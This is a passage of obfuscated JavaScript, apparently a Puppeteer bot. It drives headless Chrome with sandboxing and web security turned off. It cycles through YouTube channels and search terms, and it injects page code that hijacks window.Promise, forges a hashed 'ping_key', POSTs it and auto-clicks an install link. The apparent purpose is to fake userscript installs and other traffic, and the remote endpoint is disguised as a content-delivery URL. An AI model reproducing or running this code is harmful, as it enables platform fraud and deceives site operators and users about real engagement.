                J[0x1 * 0x1efd + 0x422 + -0x167 * 0x19] = this['block'], J[K >> 0xa27 + -0x1 * -0x349 + -0xd6e] |= x[-0x1b1b + 0x7f6 + 0x8 * 0x265 & K], this['block'] = J[0x10e0 + -0x4b3 * 0x4 + 0x1fc], K >= -0x16f * -0x5 + 0x24d9 + -0x1 * 0x2bcc && (this['hashed'] || this['hash'](), J[-0x9d * -0x37 + -0x17e * 0x1 + -0x203d] = this['block'], J[-0x2 * 0x62b + 0xb33 + 0x133] = J[-0x685 * 0x1 + 0x45 * 0x23 + -0x95 * 0x5] = J[0x9c9 + 0x1e34 + -0x27fb] = J[0x95 * 0x1f + 0xa27 + 0x5a3 * -0x5] = J[-0x1 * 0x1b77 + -0x1198 + 0x2d13] = J[0x11 * -0x12c + 0x1d3 + 0x90f * 0x2] = J[0x1ad + 0xe74 + -0x101b] = J[0x1 * -0x2567 + 0x230b + -0x263 * -0x1] = J[-0x82d + 0x4ea + 0x34b] = J[0x237 + 0x2 * 0x9e3 + 0xafa * -0x2] = J[-0x1c07 * 0x1 + -0x7ab * 0x1 + 0x2 * 0x11de] = J[-0x17f * -0x15 + -0x15cf + -0x991 * 0x1] = J[0x1d3 * -0x3 + -0x2405 + 0x1a * 0x199] = J[-0x2701 + -0x464 + 0x2b72] = J[-0xb * -0x237 + 0x39 * 0x3f + -0x2656] = J[0x11e1 * -0x1 + -0x1f96 + 0x3186] = 0x206 + -0x13c7 + 0x11c1), J[-0x3 * -0x6fb + -0x18cb + 0x3e8] = this['hBytes'] << -0x2e5 + -0x169c + -0x2e * -0x8e | this['bytes'] >>> 0x16c4 + -0x26ba * 0x1 + 0x1013, J[0x16ce + 0x4df + -0x1b9e] = this['bytes'] << -0x1 * -0x1faa + 0x1 * -0x2099 + -0xf2 * -0x1, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0xa04 + -0x1827 + 0x223b; J < -0x52 * -0x1 + -0x15 * 0x13d + 0x79 * 0x37; ++J)
                K = Q[J - (-0xb * -0x8e + 0x194b + -0xce * 0x27)] ^ Q[J - (-0x24ae + -0xd * 0x6a + 0x2a18)] ^ Q[J - (0x1f7 + 0x16ff + -0x18e8)] ^ Q[J - (-0x1 * -0x11cb + -0x23b * 0x9 + 0x258)], Q[J] = K << 0x7 * 0x412 + 0x3d6 * 0x1 + 0x1 * -0x2053 | K >>> 0x1128 + 0x2543 + -0x364c;
              for (J = -0x5 * -0x6a9 + -0x24b7 + 0x1b5 * 0x2; J < 0x1854 + 0x2 * 0xcf2 + -0x1912 * 0x2; J += -0x13c * 0x7 + -0x1 * 0x11a1 + -0x1a4a * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1fa * 0x11 + 0x327 + -0x24bc | L >>> 0x143 * 0x1 + -0x2 * 0xf0f + -0xe7b * -0x2) + (M & N | ~M & O) + P + (-0xaa55a953 * -0x1 + 0x7667b2e0 + -0x150c4e * 0x96b) + Q[J] << -0x23a + -0x2 * -0x4e4 + -0x78e) << -0x2 * -0x114a + 0x178d * 0x1 + -0xe87 * 0x4 | P >>> -0x67 * -0x54 + 0x1d09 + 0x7 * -0x8f6) + (L & (M = M << -0x384 + -0x4bf + 0x861 | M >>> 0x1b1 * 0x12 + 0x2 * -0xcb5 + 0x506 * -0x1) | ~L & N) + O + (0x2b53e43c * -0x3 + 0x1b1225ed + 0x1088 * 0xbb34c) + Q[J + (-0x1 * 0x1ab2 + -0x3 * 0x527 + -0xa8a * -0x4)] << -0x5e5 + -0x1946 + 0x4f * 0x65) << 0x2636 + 0x16bc + -0x9 * 0x6c5 | O >>> -0x1102 + -0x2055 + 0x1 * 0x3172) + (P & (L = L << -0x1 * -0xf63 + -0x3d6 + 0x1 * -0xb6f | L >>> -0x1 * -0xdc + -0x1d5c + 0x1c82) | ~P & M) + N + (0x9725470d + -0x6cc10b01 + 0x301e3d8d) + Q[J + (-0x5 * 0xed + -0x12c2 + 0x1765)] << 0xfa6 + 0x1 * -0x1c33 + 0x1cb * 0x7) << -0x2592 + -0x1b03 + 0x409a | N >>> 0x146 + 0xbfe + -0x3 * 0x463) + (O & (P = P << 0x1d3c + 0x2005 + -0x3d23 | P >>> -0x13 * 0xd + 0x1ae * 0x1 + 0xb5 * -0x1) | ~O & L) + M + (0x2 * 0x6c6d1bb + -0x39543dcf + -0x2 * -0x432489f9) + Q[J + (-0x4e * 0x76 + -0x1 * 0x1625 + 0x3a1c)] << 0x1 * 0x1e3d + 0x1881 + -0x36be) << -0x10f * 0x1b + -0xdf0 + -0xc6 * -0x37 | M >>> 0x195 * 0xb + -0x522 * 0x4 + -0x3 * -0x114) + (N & (O = O << 0x5 * 0x3aa + -0x26 * 0x85 + 0x18a | O >>> 0x127b + -0x652 + 0x11 * -0xb7) | ~N & P) + L + (-0x4cfa743 * -0x16 + -0x38 * 0x1d1570a + 0x56752407 * 0x1) + Q[J + (-0x1a3 + -0xe46 + 0xfed)] << -0x1 * -0x1f9d + -0x1 * 0xac2 + -0x14db, N = N << -0x29 * 0x8 + -0x1788 + 0x18ee * 0x1 | N >>> -0x104b + -0x58 * -0x32 + -0xe3;
              for (; J < 0x662 * -0x2 + -0x1 * 0x222b + -0x5 * -0x96b; J += 0x1e2 * -0x2 + -0x12b * 0xb + 0x2 * 0x851)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1fd6 + -0x2324 + -0x3 * -0x1655 | L >>> 0xcff * 0x1 + -0x1b8d + -0x9 * -0x1a1) + (M ^ N ^ O) + P + (-0x5 * -0x21b01d7d + 0x4e2 * -0x14cdfa + 0x1 * 0x2bff16e4) + Q[J] << 0x22cb * 0x1 + -0x1c8 * 0x15 + -0xdf * -0x3) << -0xc1b + 0xfb3 * -0x2 + 0x2b86 | P >>> -0x1fc2 + -0x2 * 0xa11 + 0x11 * 0x30f) + (L ^ (M = M << 0x1832 + -0x91 * -0x32 + -0x3466 | M >>> -0x8a7 + -0x1 * -0xbbd + -0x314) ^ N) + O + (-0x93f7fe7 + -0x3ba * 0x372c1b + 0x145b3c826) + Q[J + (-0x23f6 + -0x1b79 + -0x1d0 * -0x23)] << 0x6 * 0x181 + 0x1f26 + -0x282c) << -0xcb + 0x1 * -0x86 + 0xab * 0x2 | O >>> 0x1a42 + -0x1b6b + 0x2 * 0xa2) + (P ^ (L = L << -0x2195 * 0x1 + 0x1 * -0xeff + 0x2 * 0x1859 | L >>> 0x1e11 + -0x259d + -0x3c7 * -0x2) ^ M) + N + (0xd087e2a6 + 0x5eef * 0x1e619 + -0x379697ac * 0x5) + Q[J + (-0x1ac1 + -0x2 * -0xbc5 + -0x37 * -0xf)] << 0x1 * -0x1489 + 0x1871 * -0x1 + 0x167d * 0x2) << -0x1ac0 + -0x1987 + -0x2 * -0x1a26 | N >>> 0x263 + -0x621 * 0x3 + 0x101b) + (O ^ (P = P << 0x239e + -0x1bb2 + 0x12 * -0x6f | P >>> 0x1e41 * -0x1 + -0x235b * 0x1 + 0x419e) ^ L) + M + (0x42bcc569 + 0x7421f3a5 + 0x7b69 * -0x9565) + Q[J + (0x8 * 0x468 + 0x194d * -0x1 + -0x4 * 0x27c)] << -0x1465 + -0x1 * 0xa0a + 0x173 * 0x15) << -0x1b28 + -0x1e73 + -0x2 * -0x1cd0 | M >>> 0x1 * 0x745 + 0x1d1e + -0x2448) + (N ^ (O = O << -0x1473 + -0x1972 * 0x1 + -0x2e03 * -0x1 | O >>> 0xb13 + 0xd28 + -0x9 * 0x2b1) ^ P) + L + (0x59af42b9 + -0x14 * -0x9230b48 + -0xa19238b8) + Q[J + (-0x106 * -0xa + 0x15e3 + -0x201b)] << -0x20a4 * 0x1 + 0x2d * -0x11 + 0x23a1 * 0x1, N = N << -0x3 * 0x720 + 0x19 * 0x4e + -0x60 * -0x25 | N >>> -0x1c9f + 0x4 * -0x43f + 0x2d9d;
              for (; J < -0x1526 + -0xb0b * 0x1 + 0x206d; J += -0x1dee + 0xd33 * -0x2 + 0x3859)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xd * -0x7a + 0x2323 + -0x2950 | L >>> -0x4a9 + 0x1 * -0x1a1 + 0x665) + (M & N | M & O | N & O) + P - (-0x1fab4527 + 0x71a02218 + 0x1eef6633) + Q[J] << -0x1a30 * 0x1 + 0x1 * -0x7d9 + 0x2209) << -0x1 * 0x2cf + 0xc42 + -0x96e | P >>> 0x139 * -0x7 + 0x1366 + 0xc * -0xe5) + (L & (M = M << -0xd01 + -0x1f34 + 0x1 * 0x2c53 | M >>> 0xf79 + -0x627 + -0x95 * 0x10) | L & N | M & N) + O - (0x3a0bc87 * -0x3d + -0x12652ae * 0x25 + 0x178bb2275) + Q[J + (-0x700 * -0x5 + -0xa02 + -0x18fd * 0x1)] << -0x8d5 + 0x1 * -0x3b3 + 0xc88) << 0x72b + -0x1576 + -0x4 * -0x394 | O >>> -0x1513 + -0x1 * -0x12f4 + 0x23a) + (P & (L = L << -0x1 * -0xe28 + -0x1 * 0x23df + 0xcf * 0x1b | L >>> -0x1e0f * 0x1 + -0x8 * 0x38b + 0x3a69) | P & M | L & M) + N - (-0x9b741721 + -0x21d3a139 * -0x4 + -0x178d * -0x5a625) + Q[J + (0x71 * 0x4e + 0x41 * 0x1c + 0x376 * -0xc)] << 0x1 * -0x1b5b + -0x22da + 0x3e35) << 0x407 + -0x43 * -0x5c + 0x59e * -0x5 | N >>> -0x7 * -0x4f4 + 0x1fbb * 0x1 + -0x424c) + (O & (P = P << 0x7d0 + 0x867 + -0x1019 | P >>> -0x8 * -0x92 + 0x156b + -0x19f9) | O & L | P & L) + M - (0x78898a39 * -0x1 + -0x8b42c43d + 0x174b0919a) + Q[J + (0xb5 + 0x2 * -0x1030 + 0x1fae * 0x1)] << -0x22b + 0xbf * 0xf + -0x906) << -0x2 * 0x6f1 + 0x254f * 0x1 + -0x1768 | M >>> -0x14fa + 0x24b3 + -0xf9e) + (N & (O = O << 0xfab * 0x2 + -0x8b9 + -0x167f | O >>> -0x2509 * -0x1 + -0x53 * -0x5e + -0x4381) | N & P | O & P) + L - (0xb * 0x11d24715 + -0x5 * -0x2efcb23 + -0x61d3c272) + Q[J + (-0x305 * -0x3 + 0x890 + 0x119b * -0x1)] << 0x26fa + 0x74e + 0x4 * -0xb92, N = N << 0x22ca + 0x1 * -0x1a44 + 0x434 * -0x2 | N >>> 0xe * -0x1 + -0x248d + 0x249d;
              for (; J < 0x990 + -0x4 * -0x132 + -0x1c1 * 0x8; J += -0x3 * 0xabd + -0x22d6 + 0x3f2 * 0x11)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2 * 0xc11 + 0x12be + 0x569 | L >>> -0x1 * 0xabd + 0x19d7 + -0xb * 0x15d) + (M ^ N ^ O) + P - (0x1f4ba565 + -0x220f261 * -0x2 + 0x120fb403) + Q[J] << 0x4f * 0x10 + -0x20af + 0x1 * 0x1bbf) << 0x13d6 * 0x1 + 0x28 * 0xb2 + -0x2fa1 | P >>> 0x2580 + 0x148a + -0x1 * 0x39ef) + (L ^ (M = M << -0x1 * -0x1e89 + -0x3bb + -0x1ab0 | M >>> 0x8e * 0x30 + -0x9ad + 0x10f1 * -0x1) ^ N) + O - (-0x13601b09 * 0x4 + 0x15 * 0x50d8a77 + 0x19014e8b * 0x1) + Q[J + (0x2421 * -0x1 + -0x137a + 0x379c * 0x1)] << -0x1272 + 0x1068 + 0x20a) << 0x1c7e + -0xb55 + -0x1124 | O >>> 0xb65 + 0xcfe * 0x3 + -0x3244) + (P ^ (L = L << -0x26b4 + -0x13 * -0x13d + 0xf4b | L >>> 0x1111 + 0x1ef4 + -0x3003) ^ M) + N - (0x1864d47 * -0x1f + -0x10cb * -0x418d7 + 0x20137746) + Q[J + (0xf3 + -0x1fef * -0x1 + -0x20e0 * 0x1)] << -0x226e + 0x941 + 0x509 * 0x5) << 0xeef + -0x16c8 + 0x6a * 0x13 | N >>> -0x13a * -0x1d + 0x1 * -0x227d + -0xfa) + (O ^ (P = P << 0xf2a + 0x2556 + 0x3462 * -0x1 | P >>> -0x25f2 + 0x19af + 0x9 * 0x15d) ^ L) + M - (-0x4c3b2630 + 0x73867 * 0xb3 + -0x7ccbf455 * -0x1) + Q[J + (0x110 * -0x13 + 0x5b * -0x41 + 0x2b4e)] << -0x5d0 + 0x43e * 0x5 + -0xf66) << -0x1 * 0x164d + 0x32 * -0xb4 + 0x397a | M >>> 0x10 * -0x240 + -0x1738 * 0x1 + 0x3b53) + (N ^ (O = O << 0x2302 * 0x1 + 0x1e50 + -0xd6 * 0x4e | O >>> -0x1c20 + 0xc42 + 0xfe0) ^ P) + L - (-0x2826cb * 0x169 + -0x57b6a0cb + 0xc5f29338) + Q[J + (-0x38a + 0x202e + -0x1ca0)] << 0x1 * 0x26ef + 0x4 * -0x6b + -0x2543, N = N << 0x1 * 0x10c7 + 0x2377 + -0x3420 | N >>> 0x7f * -0xa + -0x25 * 0x5 + -0x1 * -0x5b1;
              this['h0'] = this['h0'] + L << -0x2430 + -0x18 * 0x25 + 0xbc * 0x36, this['h1'] = this['h1'] + M << 0x3 * -0x301 + -0x15b4 + -0xa3d * -0x3, this['h2'] = this['h2'] + N << -0x2b3 * 0x5 + -0x6c4 + 0x1443, this['h3'] = this['h3'] + O << 0x1584 + -0xe9 + -0x149b, this['h4'] = this['h4'] + P << -0x1414 + 0x1 * -0x1ad8 + 0xc * 0x3e9;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0xbfa + -0x696 + 0x2 * 0x956 & 0x11a8 + -0x23b * 0x11 + 0x1452] + w[J >> -0x2406 + -0xd7 + 0x24f5 & 0x7 * 0x385 + 0x1c8e + -0x3522] + w[J >> -0x169f * -0x1 + 0xaee + -0x2179 & -0x49 * -0x51 + 0x111e + -0x2828] + w[J >> 0x3 * 0x3c5 + -0x1b * -0x104 + -0x209 * 0x13 & 0x11ec + 0x1f73 + -0x3150] + w[J >> 0x14f0 + 0x1ef8 * 0x1 + -0x33dc & -0x24fb + -0xf14 + -0x341e * -0x1] + w[J >> 0x8e0 * 0x4 + -0x112a + 0x927 * -0x2 & 0x358 + 0x3 * -0x137 + 0x5c] + w[J >> -0x6 * 0x3e7 + 0x9a9 * -0x1 + 0x2117 & 0x2 * 0x11e8 + -0x1 * -0x22b7 + -0x52 * 0xdc] + w[0x1a * 0x4d + 0x3d * -0x41 + -0x17 * -0x56 & J] + w[K >> -0x14e * 0xb + -0x1 * -0x1805 + -0x98f & -0x2613 + 0x103 * 0x1 + 0x251f] + w[K >> 0x1b66 + 0xd44 + -0x2892 & -0x2411 * -0x1 + -0x1b1f + -0x8e3] + w[K >> 0x1 * -0x1ce2 + -0x1287 + 0x1 * 0x2f7d & -0x1d1f + 0x197d + 0x3b1] + w[K >> 0x13 * -0x17b + -0x1abd + 0x36ee & 0x11 * 0x112 + -0x1 * 0x9f1 + 0x832 * -0x1] + w[K >> -0x138e + -0x7ad * -0x1 + 0xbed & -0xbd * -0x23 + -0x133 + 0x1f * -0xcb] + w[K >> -0xe6 * -0x2 + -0x2610 + 0x244c & -0x1d21 + 0x66b + 0x16c5] + w[K >> 0x12c0 + 0x1d7 * -0x3 + 0xd37 * -0x1 & -0x999 * 0x1 + -0x6fc * -0x3 + -0xb4c] + w[0x871 + 0x51 * 0x31 + -0x17e3 & K] + w[L >> 0x1 * 0xa8d + 0x4 * -0x4d + -0x93d & 0xd9 * -0x4 + 0x11 * 0x21d + -0x207a] + w[L >> 0x12a9 + -0x1b34 + -0x21 * -0x43 & 0x1821 + 0x190a + -0x311c] + w[L >> 0x7 * -0x95 + -0x1b7 + 0x5de & 0x3 * 0x583 + 0x1 * 0x19fd + -0x2a77] + w[L >> -0x22a2 + 0x1 * 0x243a + 0x1 * -0x188 & -0x13f * 0xb + 0x1 * 0x737 + 0x81 * 0xd] + w[L >> -0x3b5 + -0x2678 + -0xe13 * -0x3 & 0x2 * 0xd87 + -0x18 * -0x55 + -0x22f7 * 0x1] + w[L >> 0x2 * 0xa63 + 0x1aba + -0x2f78 & -0x2 * 0x161 + -0xb46 + 0xe17] + w[L >> 0x1a39 + 0x1167 + -0x2b9c & 0x2152 + 0xfb * -0x10 + 0x1193 * -0x1] + w[0x1eae + 0x5e1 + 0x124 * -0x20 & L] + w[M >> 0x1924 * -0x1 + -0x13e * 0xc + 0x2828 & 0xb * 0x180 + -0x6d * -0x17 + -0x1 * 0x1a3c] + w[M >> 0x122 + 0x5 * -0x584 + 0x2 * 0xd45 & -0x15a * -0x19 + 0x4cb + -0x2 * 0x1343] + w[M >> -0x974 + -0x6 * 0x375 + 0x1e46 & 0x1a45 + -0x7c9 + -0x126d] + w[M >> -0x1954 + -0x142 * -0x16 + -0x248 * 0x1 & 0xb79 + -0x19ac + 0xe42] + w[M >> 0x13bb * -0x1 + -0x1 * -0xe71 + 0x556 & -0x2 * 0xdf + -0x18 * -0xe5 + 0x5 * -0x3ef] + w[M >> 0xd17 + -0x1869 + -0x2 * -0x5ad & 0x1 * -0x1b6e + 0x75d + 0x1420] + w[M >> 0x917 + 0x13 * 0xb5 + -0x1682 & 0xb5d + 0x16eb * -0x1 + 0xb9d] + w[-0x2365 + 0xfb * 0x27 + -0x2c9 & M] + w[N >> -0xa93 * 0x1 + 0xd * -0x8b + -0x11be * -0x1 & 0xb * 0x41 + -0x119 * -0xd + -0x1101] + w[N >> 0xc * 0x4f + 0x9 * 0x3a4 + -0x2460 & -0x868 + -0x5a5 * 0x6 + -0x2a55 * -0x1] + w[N >> 0x1 * -0x1267 + -0x284 + 0x7d * 0x2b & 0xafd + -0x16da + 0xbec] + w[N >> -0x199b + -0x1517 * -0x1 + 0x494 & 0x59 * -0x6e + -0x335 * -0x3 + 0x1cae] + w[N >> -0x1fe1 * -0x1 + -0x3ff + 0x2 * -0xdeb & 0x68d * -0x2 + 0x1 * 0x679 + 0x10 * 0x6b] + w[N >> -0x6d * 0x2e + 0x1c53 * 0x1 + 0x1 * -0x8b5 & -0xc * 0x2f5 + 0xd4d + -0x6 * -0x3b5] + w[N >> -0x2676 + -0x153 + -0x17 * -0x1bb & 0x1b + 0x2aa * 0xa + 0x8 * -0x356] + w[0x1 * -0x205d + 0x1c41 + 0x1 * 0x42b & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x186 + -0x26e2 + 0x2880 & -0x1bbe + 0xd * -0x2ae + 0x3f93,
                J >> 0x1 * 0x17c9 + -0x11 * -0xa3 + -0xb84 * 0x3 & 0xdf1 + -0x9 * -0x30b + 0x19 * -0x19d,
                J >> 0x1a18 + -0x2257 + 0x847 & 0x1e83 + -0x295 * -0x1 + -0x3 * 0xab3,
                -0x1f5 * -0xb + -0x4c1 + 0x7 * -0x241 & J,
                K >> -0x201d + -0x388 * -0xb + -0x1 * 0x6a3 & -0x1 * 0xa9a + -0x1b16 + 0x26af,
                K >> -0x1205 * -0x1 + -0x1116 + 0xdf * -0x1 & -0xf9 * 0xd + 0x61 * -0x5 + -0xf89 * -0x1,
                K >> 0xe9b * -0x1 + 0x6e * 0x7 + -0xe5 * -0xd & -0x1 * -0xb1 + 0x3ce + -0x380,
                -0x19 * 0x143 + -0xb06 + 0x2b90 & K,
                L >> -0x6 * 0x5a7 + -0x767 + 0x1 * 0x2969 & 0x24a0 * -0x1 + -0x1 * -0x2da + 0x22c5,
                L >> 0x1 * -0x1f49 + 0x4c7 * -0x1 + 0x2420 & 0x3 * -0x2c2 + 0x8 * -0x34 + 0xae5 * 0x1,
                L >> -0x22b5 + -0x275 * -0x6 + 0x1 * 0x13ff & 0x10fa + 0xd * -0x44 + 0x42d * -0x3,
                0x23f9 + 0x1 * -0x16c5 + -0xc35 & L,
                M >> -0x33b * -0xb + -0x1f5f + -0x412 * 0x1 & 0x1d0e + 0x14ae + -0x30bd * 0x1,
                M >> -0x5cb * -0x5 + 0x1297 + -0x17bf * 0x2 & -0xb2 + -0x26a + 0x41b,
                M >> 0x3 * 0x7eb + 0x251d + -0x3cd6 & 0x207a + 0x1f68 + 0x3ee3 * -0x1,
                -0x11b * 0x1c + 0x60c + 0x19e7 & M,
                N >> 0x40 * -0x67 + 0x242e + 0x7e * -0x15 & 0x7b * 0x1a + -0x86b * -0x1 + 0x9f5 * -0x2,
                N >> 0x3fa + 0x18d * 0x4 + -0xa1e & 0xeb2 + -0x1321 + 0x56e,
                N >> 0x16f9 + -0x10d0 + -0x621 & -0x68e + 0xbc3 * -0x3 + 0x2ad6,
                -0x1 * -0x1b1b + -0x38f + 0x1 * -0x168d & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x5 * 0x249 + 0x12b2 + -0x731), (K = new DataView(J))['setUint32'](-0x10aa + 0x6 * -0x5fc + 0x3492, this['h0']), K['setUint32'](-0xa3e + 0x7 * 0x3cb + 0x1 * -0x104b, this['h1']), K['setUint32'](-0x1360 + -0xd * -0x1bf + -0x34b, this['h2']), K['setUint32'](-0x2521 + 0x1f * 0x51 + 0x1b5e, this['h3']), K['setUint32'](-0xa36 + -0x1b1 * 0xa + -0xf * -0x1d0, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G[W(0x3)]['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x3cd * -0x6 + -0x19cf + 0x301];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x15e7 + -0x726 + -0xec1;
            J[-0x123 * 0xc + -0x1afd * -0x1 + 0x3 * -0x473]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x1810 + 0x2 * 0x10b9 + -0x962] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x24f * 0x1 + 0x18e1 + -0x1691), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x8ed * 0x1 + -0x2454 + 0x1b68;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0xdb9 + 0xab0 + 0x8e5), Promise['resolve'](0x11a4 + -0x143 * 0x15 + -0x24 * -0x3f);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s[X(0x7)](), await r['close'](), i());
    }
  }
  for (let j = 0x7 * 0x3e + -0x125 * -0xd + -0x1093 * 0x1; j < 0x1 * -0x22a9 + 0x3a * 0x33 + 0x171c; j++)
    i();
}
const NETWORK_PATIENCE = -0xb * -0x595 + -0x2747 + 0x920 + (0x1 * -0x24cb + 0x1900 + 0x1783) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x1 * -0x7bb + -0x25c * 0x8 + 0xd4f * 0x2) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    Y(0x1f) + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x60d * 0x1 + -0x2153 * -0x1 + -0x2760; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + Z(0x16, '!A36') + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 